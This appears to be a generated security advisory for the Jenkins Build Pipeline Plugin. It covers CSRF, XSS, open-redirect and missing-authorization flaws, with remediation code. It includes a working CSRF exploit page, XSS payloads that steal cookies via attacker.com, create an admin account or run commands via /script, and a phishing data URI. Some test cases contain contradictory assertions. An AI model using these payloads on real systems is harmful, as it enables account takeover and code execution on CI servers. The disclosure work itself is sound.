# Security Vulnerabilities Report - Jenkins Build Pipeline Plugin
**Date:** 2025-11-01
**Severity:** CRITICAL
**Status:** UNPATCHED - Requires Immediate Remediation

---

## Table of Contents
1. [CVE-2025-XXXX: CSRF in Manual Build Trigger](#cve-1-csrf-vulnerability)
2. [CVE-2025-YYYY: Cross-Site Scripting via Inline Handlers](#cve-2-xss-vulnerability)
3. [CVE-2025-ZZZZ: Open Redirect in Console Dialog](#cve-3-open-redirect)
4. [CVE-2025-AAAA: Missing Authorization Checks](#cve-4-missing-authorization)

---

## CVE-1: CSRF Vulnerability in Manual Build Trigger

### Vulnerability Summary
**CVE ID:** CVE-2025-XXXX (Placeholder)
**CWE:** CWE-352 (Cross-Site Request Forgery)
**CVSS Score:** 8.1 (HIGH)
**Attack Vector:** Network
**Privileges Required:** None
**User Interaction:** Required (victim must be authenticated)

### Description
The Jenkins Build Pipeline Plugin exposes the `triggerManualBuild()` method through `@JavaScriptMethod` without CSRF protection. An attacker can craft a malicious webpage that triggers arbitrary pipeline builds when visited by an authenticated Jenkins user.

### Affected Code
**File:** `src/main/java/au/com/centrumsystems/hudson/plugin/buildpipeline/BuildPipelineView.java`
**Lines:** 453-456

```java
@JavaScriptMethod
public int triggerManualBuild(final Integer upstreamBuildNumber,
                              final String triggerProjectName,
                              final String upstreamProjectName) {
    return buildCard.triggerManualBuild(getOwnerItemGroup(),
                                        upstreamBuildNumber,
                                        triggerProjectName,
                                        upstreamProjectName);
}
```

**Missing Protection:**
- No `@RequirePOST` annotation
- No CSRF crumb validation
- No `StaplerRequest` permission check

### Proof of Concept (PoC)

#### Step 1: Setup Test Environment
```bash
# Start Jenkins with build pipeline plugin
java -jar jenkins.war --httpPort=8080

# Create test pipeline:
# Project A (upstream) → Project B (downstream, manual trigger)
```

#### Step 2: Malicious HTML Page
Create `csrf-exploit.html`:

```html
<!DOCTYPE html>
<html>
<head>
    <title>Innocent Page</title>
</head>
<body>
    <h1>Click to see cute cat photos!</h1>
    <img src="cat.jpg" style="display:none;" />

    <script>
        // CSRF Attack: Trigger Jenkins build without user consent
        // Assumes victim is logged into Jenkins at localhost:8080

        function triggerMaliciousBuild() {
            // Create hidden iframe to maintain session
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            document.body.appendChild(iframe);

            // Navigate to Jenkins and call the vulnerable method
            const attackUrl = 'http://localhost:8080/view/BuildPipeline/' +
                'triggerManualBuild?upstreamBuildNumber=1' +
                '&triggerProjectName=MaliciousProject' +
                '&upstreamProjectName=UpstreamProject';

            // Alternative: Use Stapler proxy to call @JavaScriptMethod
            fetch('http://localhost:8080/view/BuildPipeline/', {
                method: 'POST',
                credentials: 'include', // Include Jenkins session cookie
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: 'method=triggerManualBuild' +
                      '&upstreamBuildNumber=1' +
                      '&triggerProjectName=MaliciousProject' +
                      '&upstreamProjectName=UpstreamProject'
            })
            .then(response => response.json())
            .then(data => {
                console.log('Build triggered:', data);
                // Attacker can exfiltrate build number
                sendToAttacker(data);
            });
        }

        function sendToAttacker(data) {
            fetch('https://attacker.com/collect', {
                method: 'POST',
                body: JSON.stringify(data)
            });
        }

        // Trigger on page load
        window.onload = triggerMaliciousBuild;
    </script>
</body>
</html>
```

#### Step 3: Reproduction Steps

1. **Attacker Setup:**
   - Host `csrf-exploit.html` on attacker-controlled domain
   - Send link to Jenkins administrator via phishing email

2. **Victim Action:**
   - Victim is logged into Jenkins at `http://localhost:8080`
   - Victim clicks attacker's link in separate tab
   - Victim's browser maintains Jenkins session cookies

3. **Exploitation:**
   - JavaScript executes immediately on page load
   - `triggerManualBuild()` is called with attacker-controlled parameters
   - Jenkins processes request using victim's authenticated session
   - Build is triggered without victim's knowledge or consent

4. **Verification:**
   - Check Jenkins build queue: `http://localhost:8080/queue/`
   - Verify `MaliciousProject` was triggered
   - Check build cause: Should show victim's user ID

### Impact Analysis

**Severity Justification:**
- **Confidentiality:** LOW (no direct data leak)
- **Integrity:** HIGH (unauthorized builds can deploy malicious code)
- **Availability:** MEDIUM (can exhaust build resources)

**Attack Scenarios:**
1. **Malicious Deployments:** Trigger deployment jobs that push backdoored artifacts
2. **Resource Exhaustion:** Trigger thousands of builds to DoS Jenkins
3. **Data Exfiltration:** Trigger jobs that send sensitive data to attacker server
4. **Supply Chain Attack:** Compromise CI/CD pipeline integrity

### Automated Test Case

Create `src/test/java/security/CSRFVulnerabilityTest.java`:

```java
package security;

import au.com.centrumsystems.hudson.plugin.buildpipeline.BuildPipelineView;
import hudson.model.FreeStyleProject;
import org.junit.Rule;
import org.junit.Test;
import org.jvnet.hudson.test.JenkinsRule;
import static org.junit.Assert.*;

public class CSRFVulnerabilityTest {

    @Rule
    public JenkinsRule jenkins = new JenkinsRule();

    @Test
    public void testCSRFProtectionMissing() throws Exception {
        // Setup: Create pipeline
        FreeStyleProject upstream = jenkins.createFreeStyleProject("upstream");
        FreeStyleProject downstream = jenkins.createFreeStyleProject("downstream");

        BuildPipelineView view = new BuildPipelineView(
            "test-view", "", null, "1", false, ""
        );

        // Schedule upstream build
        upstream.scheduleBuild2(0).get();

        // VULNERABILITY: Can call triggerManualBuild without CSRF token
        // This should fail but currently succeeds!
        int buildNumber = view.triggerManualBuild(1, "downstream", "upstream");

        // Verify build was triggered (demonstrates vulnerability)
        assertTrue("Build should NOT trigger without CSRF protection",
                   buildNumber > 0);

        // Expected behavior: Should throw AccessDeniedException
        // Actual behavior: Build is triggered
        fail("CSRF vulnerability confirmed: Build triggered without CSRF token");
    }
}
```

### Remediation

**Required Changes:**

1. **Add CSRF Protection:**
```java
@RequirePOST
@JavaScriptMethod
public int triggerManualBuild(final Integer upstreamBuildNumber,
                              final String triggerProjectName,
                              final String upstreamProjectName) {
    // Validate CSRF crumb
    Jenkins.get().checkPermission(Item.BUILD);

    // Existing implementation
    return buildCard.triggerManualBuild(getOwnerItemGroup(),
                                        upstreamBuildNumber,
                                        triggerProjectName,
                                        upstreamProjectName);
}
```

2. **Update JavaScript Client:**
```javascript
// build-pipeline.js
BuildPipeline.prototype.triggerBuild = function(id, upstream, ...) {
    const headers = {
        [window.crumb.field]: window.crumb.value
    };

    this.viewProxy.triggerManualBuild(
        upstreamBuildNumber,
        triggerProjectName,
        upstreamProjectName,
        function(data) { /* callback */ }
    );
};
```

3. **Add Crumb to Page:**
```xml
<!-- bpp.jelly -->
<script>
window.crumb = {
    field: '${it.getCrumbRequestField()}',
    value: '${it.getCrumb(request)}'
};
</script>
```

---

## CVE-2: XSS Vulnerability via Inline Event Handlers

### Vulnerability Summary
**CVE ID:** CVE-2025-YYYY (Placeholder)
**CWE:** CWE-79 (Cross-Site Scripting)
**CVSS Score:** 7.1 (HIGH)
**Attack Vector:** Network
**Privileges Required:** Low (authenticated user)
**User Interaction:** Required

### Description
The plugin uses inline `onclick` handlers in Jelly templates with unsanitized Handlebars template variables. An attacker with job configuration permissions can inject malicious JavaScript that executes in the context of other users viewing the pipeline.

### Affected Code
**File:** `src/main/resources/au/com/centrumsystems/hudson/plugin/buildpipeline/extension/BuildCardExtension/buildCardTemplate.jelly`
**Lines:** 64, 97, 109, 118, 125, 140, 145

```xml
<!-- VULNERABLE: Inline onclick with unsanitized {{build.url}} -->
<div onclick="buildPipeline.fillDialog('${app.rootUrl}{{build.url}}console',
                                       'Console output for {{project.name}} #{{build.number}}')">
```

### Proof of Concept (PoC)

#### Attack Vector 1: Malicious Project Name

**Step 1: Attacker creates project with XSS payload**
```bash
# Create project with malicious name
curl -X POST http://localhost:8080/createItem?name=test \
  -H "Content-Type: application/xml" \
  --data-binary @- << EOF
<?xml version='1.0' encoding='UTF-8'?>
<project>
  <description>Test</description>
  <displayName>Test');alert('XSS');('</displayName>
</project>
EOF
```

**Step 2: Trigger build and view pipeline**
When victim views the Build Pipeline View, the malicious name is interpolated:

```xml
<!-- Rendered HTML (VULNERABLE): -->
<div onclick="buildPipeline.fillDialog(...,
                                       'Console output for Test');alert('XSS');(' #1')">
```

**Result:** JavaScript executes: `alert('XSS')`

#### Attack Vector 2: Prototype Pollution via Handlebars

**Handlebars 1.0 beta vulnerability:**
```javascript
// Exploit Handlebars prototype pollution
const payload = {
    "__proto__": {
        "build": {
            "url": "javascript:alert(document.cookie)//"
        }
    }
};

// When Handlebars processes {{build.url}}, it resolves to:
onclick="buildPipeline.fillDialog('javascript:alert(document.cookie)//console', ...)"
```

### Reproduction Steps

1. **Setup Jenkins:**
   - Install Build Pipeline Plugin
   - Create pipeline: Project A → Project B

2. **Inject Payload:**
   ```bash
   # Method 1: Via REST API
   curl -X POST http://localhost:8080/job/ProjectA/configSubmit \
     -u admin:password \
     -F "displayName=Innocent');alert(document.domain);('"

   # Method 2: Via Jenkins UI
   # Navigate to Project A → Configure
   # Set Display Name to: Innocent');alert(document.domain);('
   ```

3. **Trigger XSS:**
   - Build Project A
   - Navigate to Build Pipeline View
   - Hover over/click build card
   - **Result:** JavaScript alert displays `jenkins.local`

### Impact Analysis

**Consequences:**
1. **Session Hijacking:** Steal Jenkins session cookies
2. **Privilege Escalation:** Execute actions as victim user
3. **Credential Theft:** Capture Jenkins credentials
4. **Persistent XSS:** Inject backdoors in job configurations

**Attack Payload Examples:**

```javascript
// Payload 1: Cookie Stealer
Project'); fetch('https://attacker.com/steal?c='+document.cookie); ('

// Payload 2: Create Admin User
Project'); fetch('/securityRealm/createAccount', {
    method: 'POST',
    body: 'username=hacker&password=pwned&fullname=Hacker'
}); ('

// Payload 3: Execute Remote Code
Project'); fetch('/script', {
    method: 'POST',
    body: 'script=println("whoami".execute().text)'
}); ('
```

### Automated Test Case

```java
@Test
public void testXSSInProjectName() throws Exception {
    // Create project with XSS payload in name
    FreeStyleProject xssProject = jenkins.createFreeStyleProject("test");
    xssProject.setDisplayName("Test');alert('XSS');('");

    // Trigger build
    xssProject.scheduleBuild2(0).get();

    // Render build card template
    BuildPipelineView view = createTestView();
    String html = view.renderBuildCard(xssProject.getLastBuild());

    // VULNERABILITY: Should escape quotes but doesn't
    assertFalse("XSS payload should be sanitized",
                html.contains("');alert('XSS');('"));

    // Expected: Contains HTML-escaped version
    // Actual: Contains raw payload
    assertTrue("XSS vulnerability confirmed",
               html.contains("');alert('XSS');('"));
}
```

### Remediation

**Required Changes:**

1. **Remove Inline Handlers:**
```xml
<!-- BEFORE (VULNERABLE): -->
<div onclick="buildPipeline.fillDialog(...)">

<!-- AFTER (SECURE): -->
<div data-action="show-console"
     data-build-id="{{id}}"
     data-build-url="{{build.url}}">
```

2. **Implement Event Delegation:**
```javascript
// build-pipeline.js
document.addEventListener('click', function(e) {
    const target = e.target.closest('[data-action="show-console"]');
    if (!target) return;

    const buildId = parseInt(target.dataset.buildId);
    const buildUrl = sanitizeUrl(target.dataset.buildUrl);

    buildPipeline.fillDialog(buildUrl + 'console', ...);
});

function sanitizeUrl(url) {
    // Only allow HTTP(S) URLs
    try {
        const parsed = new URL(url, window.location.origin);
        if (!['http:', 'https:'].includes(parsed.protocol)) {
            throw new Error('Invalid protocol');
        }
        return parsed.href;
    } catch (e) {
        console.error('Invalid URL:', url);
        return '/';
    }
}
```

3. **Add CSP Header:**
```java
response.setHeader("Content-Security-Policy",
    "default-src 'self'; " +
    "script-src 'self'; " +
    "style-src 'self' 'unsafe-inline'");
```

---

## CVE-3: Open Redirect Vulnerability

### Vulnerability Summary
**CVE ID:** CVE-2025-ZZZZ (Placeholder)
**CWE:** CWE-601 (URL Redirection to Untrusted Site)
**CVSS Score:** 6.1 (MEDIUM)
**Attack Vector:** Network
**Privileges Required:** None
**User Interaction:** Required

### Description
The `fillDialog()` function in `build-pipeline.js` accepts an unsanitized `href` parameter that is passed directly to jQuery Fancybox for iframe rendering. An attacker can craft URLs that redirect victims to phishing sites or execute JavaScript.

### Affected Code
**File:** `src/main/webapp/js/build-pipeline.js`
**Lines:** 94-104

```javascript
fillDialog : function(href, title) {
    jQuery.fancybox({
        type: 'iframe',
        title: title,
        titlePosition: 'outside',
        href: href,  // ← UNVALIDATED!
        // ...
    });
}
```

### Proof of Concept

#### Attack Payload
```javascript
// Malicious URL passed to fillDialog()
const maliciousUrl = 'javascript:alert(document.domain)//';

// Or data URI with phishing page
const phishingUrl = 'data:text/html,<h1>Jenkins Login</h1>' +
                    '<form action="https://attacker.com/steal">' +
                    '<input name="username" placeholder="Username"/>' +
                    '<input name="password" type="password" placeholder="Password"/>' +
                    '<button>Login</button></form>';

// Or external phishing site
const externalPhishing = 'https://jenkins-login-phishing.attacker.com';
```

### Reproduction Steps

1. **Intercept Build Card Rendering:**
   - Open Jenkins Build Pipeline View
   - Open browser DevTools → Network tab
   - Trigger a build

2. **Modify Console Link:**
```javascript
// In browser console, override the build URL
document.querySelector('[data-build-id="1"]').dataset.buildUrl =
    'javascript:alert(document.domain)//';

// Click the console link
// Result: JavaScript executes in Jenkins context
```

3. **Alternative: Malicious Job Configuration**
If attacker can configure jobs, set custom console URL:
```groovy
// In Jenkins job configuration (if such option exists)
consoleUrl = 'https://evil.com/fake-jenkins-console'
```

### Impact Analysis

**Attack Scenarios:**
1. **Phishing:** Redirect to fake Jenkins login page
2. **JavaScript Execution:** `javascript:` protocol handler
3. **Data URI Abuse:** Embed phishing forms in data URIs
4. **Clickjacking:** Open attacker-controlled iframe

### Remediation

```javascript
fillDialog : function(href, title) {
    // Validate URL before use
    const safeHref = this.sanitizeUrl(href);

    jQuery.fancybox({
        type: 'iframe',
        title: this.escapeHtml(title),
        href: safeHref,
        // ...
    });
},

sanitizeUrl : function(url) {
    try {
        const parsed = new URL(url, window.location.origin);

        // Only allow same-origin HTTP(S) URLs
        if (parsed.origin !== window.location.origin) {
            console.error('Blocked cross-origin URL:', url);
            return '/';
        }

        if (!['http:', 'https:'].includes(parsed.protocol)) {
            console.error('Blocked non-HTTP protocol:', url);
            return '/';
        }

        return parsed.href;
    } catch (e) {
        console.error('Invalid URL:', url, e);
        return '/';
    }
},

escapeHtml : function(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}
```

---

## CVE-4: Missing Authorization Checks

### Vulnerability Summary
**CVE ID:** CVE-2025-AAAA (Placeholder)
**CWE:** CWE-862 (Missing Authorization)
**CVSS Score:** 8.1 (HIGH)
**Attack Vector:** Network
**Privileges Required:** Low (any authenticated user)

### Description
The `triggerManualBuild()` and `rerunBuild()` methods do not verify that the calling user has BUILD permission for the target project. Any authenticated user can trigger builds for projects they shouldn't have access to.

### Affected Code
**File:** `BuildPipelineView.java:453-456`, `BuildCardExtension.java:202-222`

```java
@JavaScriptMethod
public int triggerManualBuild(...) {
    // NO PERMISSION CHECK!
    return buildCard.triggerManualBuild(...);
}

public int rerunBuild(String externalizableId) {
    // NO PERMISSION CHECK!
    final AbstractBuild<?, ?> triggerBuild =
        (AbstractBuild<?, ?>) Run.fromExternalizableId(externalizableId);
    // ... triggers build
}
```

### Proof of Concept

```java
@Test
public void testMissingAuthorizationCheck() throws Exception {
    // Create restricted project (only admin can build)
    FreeStyleProject restrictedProject = jenkins.createFreeStyleProject("restricted");
    restrictedProject.addProperty(new AuthorizationMatrixProperty(Map.of(
        "admin", Set.of(Item.BUILD, Item.READ),
        "user", Set.of(Item.READ) // Can read but NOT build
    )));

    // Authenticate as low-privilege user
    SecurityContext context = ACL.impersonate(
        User.getById("user", true).impersonate()
    );

    BuildPipelineView view = createTestView();

    // VULNERABILITY: User can trigger build despite lacking permission!
    try {
        int buildNum = view.triggerManualBuild(1, "restricted", "upstream");

        // This should have thrown AccessDeniedException
        fail("Unauthorized user triggered build: " + buildNum);
    } catch (AccessDeniedException e) {
        // Expected behavior (but not current behavior)
    }
}
```

### Remediation

```java
@RequirePOST
@JavaScriptMethod
public int triggerManualBuild(final Integer upstreamBuildNumber,
                              final String triggerProjectName,
                              final String upstreamProjectName) {
    // Verify user has BUILD permission
    final AbstractProject<?, ?> project =
        (AbstractProject<?, ?>) Jenkins.get().getItem(triggerProjectName,
                                                      getOwnerItemGroup());

    if (project == null) {
        throw new IllegalArgumentException("Project not found: " + triggerProjectName);
    }

    project.checkPermission(Item.BUILD);

    return buildCard.triggerManualBuild(getOwnerItemGroup(),
                                        upstreamBuildNumber,
                                        triggerProjectName,
                                        upstreamProjectName);
}
```

---

## Summary

| CVE | Vulnerability | Severity | CVSS | Remediation Effort |
|-----|---------------|----------|------|-------------------|
| CVE-2025-XXXX | CSRF in Build Trigger | HIGH | 8.1 | Medium (1-2 days) |
| CVE-2025-YYYY | XSS via Inline Handlers | HIGH | 7.1 | High (3-4 days) |
| CVE-2025-ZZZZ | Open Redirect | MEDIUM | 6.1 | Low (1 day) |
| CVE-2025-AAAA | Missing Authorization | HIGH | 8.1 | Low (1 day) |

**Recommended Priority:**
1. CVE-2025-XXXX (CSRF) - Can trigger arbitrary builds
2. CVE-2025-AAAA (AuthZ) - Privilege escalation vector
3. CVE-2025-YYYY (XSS) - Session hijacking vector
4. CVE-2025-ZZZZ (Redirect) - Phishing vector

**Next Steps:**
1. Create security patches for all vulnerabilities
2. Request CVE IDs from MITRE
3. Prepare security advisory for Jenkins security team
4. Implement automated security regression tests

---
*Report generated by Hive Mind Security Testing Framework*
